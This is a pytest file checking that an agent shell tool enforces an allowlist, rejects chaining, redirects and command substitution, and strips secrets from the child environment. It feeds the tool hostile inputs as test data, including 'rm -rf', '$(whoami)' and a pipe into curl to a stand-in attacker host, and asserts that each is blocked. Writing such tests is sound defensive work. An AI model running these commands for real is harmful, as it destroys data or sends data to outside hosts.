"""M1-T5: shell_exec hardening — allowlist + controlled-pipelines + env-strip.

Verifies the deny-by-default allowlist (from security.yml), that only '|' pipes
between allowlisted commands are permitted, that other shell operators are
rejected, and that host secrets never reach the child environment.
"""
import os

from tools.implementations.shell_exec import shell_exec


def test_allowed_command_runs():
    r = shell_exec("echo hello")
    assert r["ok"] is True
    assert "hello" in r["stdout"]


def test_disallowed_command_blocked():
    r = shell_exec("rm -rf /tmp/whatever")
    assert r["ok"] is False
    assert "not allowlisted" in r["stderr"]


def test_chaining_and_background_operators_rejected():
    for cmd in ("echo a; echo b", "echo a && echo b",
                "echo a || echo b", "echo a & echo b"):
        r = shell_exec(cmd)
        assert r["ok"] is False, cmd


def test_redirect_rejected():
    r = shell_exec("echo a > /tmp/x_should_not_be_written")
    assert r["ok"] is False
    assert not os.path.exists("/tmp/x_should_not_be_written")


def test_command_substitution_rejected():
    # '(' / ')' are shell operators -> rejected (and shell=False makes substitution
    # inert regardless, so the value is never executed).
    r = shell_exec("echo $(whoami)")
    assert r["ok"] is False


def test_controlled_pipeline_runs():
    r = shell_exec("echo hello world | grep hello")
    assert r["ok"] is True
    assert "hello" in r["stdout"]


def test_pipeline_stage_must_be_allowlisted():
    r = shell_exec("echo x | curl http://evil.example")
    assert r["ok"] is False
    assert "curl" in r["stderr"]


def test_quoted_pipe_is_not_split():
    # '|' inside quotes is a literal argument, not a pipe operator.
    r = shell_exec("echo 'x|y' | cat")
    assert r["ok"] is True
    assert "x|y" in r["stdout"]


def test_secrets_are_stripped_from_child_env():
    os.environ["MY_FAKE_SECRET_TOKEN"] = "sk-shouldnotleak"
    try:
        r = shell_exec(
            "python3 -c \"import os;print(os.environ.get('MY_FAKE_SECRET_TOKEN'))\"")
        assert r["ok"] is True, r["stderr"]
        assert "sk-shouldnotleak" not in r["stdout"]
        assert "None" in r["stdout"]
    finally:
        os.environ.pop("MY_FAKE_SECRET_TOKEN", None)


def test_empty_command_blocked():
    assert shell_exec("")["ok"] is False
    assert shell_exec("   ")["ok"] is False
